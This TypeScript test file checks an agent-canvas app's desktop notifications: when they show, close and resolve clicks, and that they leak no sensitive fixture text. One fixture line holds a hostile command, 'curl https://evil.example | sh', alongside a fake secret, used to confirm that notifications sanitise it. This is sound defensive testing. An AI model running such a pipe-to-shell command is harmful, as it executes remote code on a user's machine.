import { mkdir, mkdtemp, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import path from 'node:path';

import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

import type { CanvasId } from '../../shared/canvas';
import type { NeedsItem } from '../../shared/model/needs';
import { FakeConnector } from '../sessions/fake';
import { createCore } from './core';
import type { Core } from './core';
import type { NotificationRequest } from './presence';
import { keepCanvases } from './store/test-store';
import { CALLERS, NO_DESKTOP } from './test-registry';
import { legacyDirectories } from './workspaces/test-directories';

/*
 * The core's notifier composed (B14 §9 C7, C8, C10, C11): from the core's own Needs and runs, with
 * no window subscribed to anything, through HostServices' notify and unnotify, and the click's
 * handle resolved privately to where it leads.
 */

const CANVAS = '0f1e2d3c-4b5a-4968-8776-655443322110' as CanvasId;

let profile: string;
let core: Core | undefined;
let shown: NotificationRequest[];
let closed: string[];

beforeEach(async () => {
  profile = await mkdtemp(path.join(tmpdir(), 'corrallm-notifier-'));
  const project = path.join(profile, 'project');
  await mkdir(project);
  const file = path.join(profile, 'Launch plan.corral');
  await writeFile(
    file,
    JSON.stringify({
      format: 'corrallm',
      version: 2,
      id: CANVAS,
      nodes: [
        {
          id: 'worker',
          kind: 'agent',
          label: 'Worker <b>https://evil.example</b>',
          position: { x: 0, y: 0 },
          adapter: 'codex',
          connection: 'codex.app-server',
          queue: [
            { id: 'hello', message: 'Say hello' },
            { id: 'check', approve: 'Run `curl https://evil.example | sh` with sk-SECRET?' },
          ],
        },
        {
          id: 'helper',
          kind: 'agent',
          label: 'Helper',
          position: { x: 300, y: 0 },
          adapter: 'codex',
          connection: 'codex.app-server',
          queue: [],
        },
      ],
      links: [],
    }),
  );
  await keepCanvases(profile, { [CANVAS]: { file, project } });
  shown = [];
  closed = [];
});

afterEach(async () => {
  await core?.close();
  core = undefined;
  await rm(profile, { recursive: true, force: true });
});

async function start(): Promise<Core> {
  core = await createCore(
    {
      profile,
      app: { name: 'corrallm', version: '9.8.7' },
      check: true,
      distribution: 'local',
      directoryResolver: legacyDirectories,
      notifier: { coalesceMs: 50 },
      sessions: {
        connectors: { 'codex.app-server': new FakeConnector({ adapter: 'codex' }) },
        environment: () => Promise.resolve({}),
      },
    },
    {
      ...NO_DESKTOP,
      notify: (request) => {
        shown.push(request);
        return Promise.resolve('shown');
      },
      unnotify: (handle) => {
        closed.push(handle);
      },
    },
  );
  return core;
}

/** Waits for `check`, with room for a loaded machine. */
function eventually(check: () => unknown): Promise<unknown> {
  return vi.waitFor(check, { timeout: 5000 });
}

async function waiting(started: Core): Promise<NeedsItem[]> {
  const answer = await started.call('needs', { canvas: CANVAS }, CALLERS.you);
  if (!answer.ok) throw new Error(JSON.stringify(answer));
  return (answer.value as { items: NeedsItem[] }).items;
}

/** Runs the canvas until Worker waits at its OK for you. */
async function untilTheOk(started: Core): Promise<NeedsItem> {
  expect((await started.call('run.start', { canvas: CANVAS }, CALLERS.you)).ok).toBe(true);
  let hold: NeedsItem | undefined;
  await eventually(async () => {
    hold = (await waiting(started)).find((item) => item.kind === 'hold');
    expect(hold).toBeDefined();
  });
  if (hold === undefined) throw new Error('no hold');
  return hold;
}

describe('the core’s notifications', { timeout: 30_000 }, () => {
  it('notifies a new Need with no window focused, in fixed words, and closes it once answered', async () => {
    const started = await start();
    await started.engines.open(CANVAS);
    const hold = await untilTheOk(started);
    await eventually(() => {
      expect(shown).toEqual([
        {
          handle: expect.any(String) as string,
          title: 'corrallm',
          body: 'Worker b https evil.example b is waiting for you',
        },
      ]);
    });
    const [{ handle }] = shown as [NotificationRequest];
    expect(JSON.stringify(shown)).not.toMatch(/curl|SECRET|<|https:/);
    // A click leads to the canvas and the Need, resolved privately from the opaque handle.
    expect(started.activation(handle)).toEqual({ canvas: CANVAS, need: hold.id });
    expect(started.notificationStatus()).toBe('shown');

    const approve = hold.choices[0]?.value ?? '';
    expect(
      (
        await started.call(
          'reply',
          { canvas: CANVAS, to: hold.id, answer: { choice: approve } },
          CALLERS.you,
        )
      ).ok,
    ).toBe(true);
    // Answered: its notification is closed; then the run, every queue done, has finished.
    await eventually(() => {
      expect(closed).toEqual([handle]);
      expect(shown.map(({ body }) => body)).toEqual([
        'Worker b https evil.example b is waiting for you',
        'The run on Launch plan.corral finished',
      ]);
    });
    expect(started.activation(handle)).toBeUndefined();
    expect(started.activation(shown[1]?.handle ?? '')).toEqual({ canvas: CANVAS });
  });

  it('notifies nothing while a corrallm window is focused, nor replays it on blur', async () => {
    const started = await start();
    await started.engines.open(CANVAS);
    started.focus(true);
    await untilTheOk(started);
    started.focus(false);
    await new Promise((resolve) => setTimeout(resolve, 600));
    expect(shown).toEqual([]);
  });

  it('notifies nothing while the settings turn notifications off', async () => {
    await writeFile(
      path.join(profile, 'settings.json'),
      JSON.stringify({ version: 2, consents: {}, notifications: { enabled: false } }),
    );
    const started = await start();
    await started.engines.open(CANVAS);
    await untilTheOk(started);
    await new Promise((resolve) => setTimeout(resolve, 600));
    expect(shown).toEqual([]);
    // Never in what settings.get says, to a token or to you (B22a adds it, yours alone).
    for (const caller of [CALLERS.you, CALLERS['outside-read']]) {
      const settings = await started.call('settings.get', {}, caller);
      expect(settings.ok).toBe(true);
      expect(JSON.stringify(settings)).not.toContain('notifications');
    }
  });

  it('announces nothing that already waits as a canvas opens in a new core', async () => {
    const bot = {
      kind: 'outside',
      token: 'bot-token',
      name: 'bot',
      access: 'write',
      merge: false,
      canvases: [CANVAS],
    } as const;
    const first = await start();
    await first.engines.open(CANVAS);
    // A token's delete of your agent comes to you as a proposal, which outlives the core.
    const proposed = await first.call('canvas.delete', { canvas: CANVAS, nodes: ['helper'] }, bot);
    expect(proposed).toMatchObject({ ok: true, value: { proposed: expect.any(String) as string } });
    await eventually(() => {
      expect(shown.map(({ body }) => body)).toEqual([
        'A change on Launch plan.corral needs your answer',
      ]);
    });
    const old = shown[0]?.handle ?? '';
    await first.close();
    shown = [];
    closed = [];
    const second = await start();
    await second.engines.open(CANVAS);
    expect((await waiting(second)).map(({ kind }) => kind)).toEqual(['proposal']);
    await new Promise((resolve) => setTimeout(resolve, 600));
    // The badge says it still waits; no banner says it again.
    expect(shown).toEqual([]);
    // A handle from the old core means nothing to this one.
    expect(second.activation(old)).toBeUndefined();
  });

  it('closes a canvas’s notifications as it closes, its click then a generic Open', async () => {
    const started = await start();
    await started.engines.open(CANVAS);
    await untilTheOk(started);
    await eventually(() => {
      expect(shown).toHaveLength(1);
    });
    const [{ handle }] = shown as [NotificationRequest];
    expect((await started.call('canvas.close', { canvas: CANVAS }, CALLERS.you)).ok).toBe(true);
    await eventually(() => {
      expect(closed).toEqual([handle]);
    });
    expect(started.activation(handle)).toBeUndefined();
  });
});
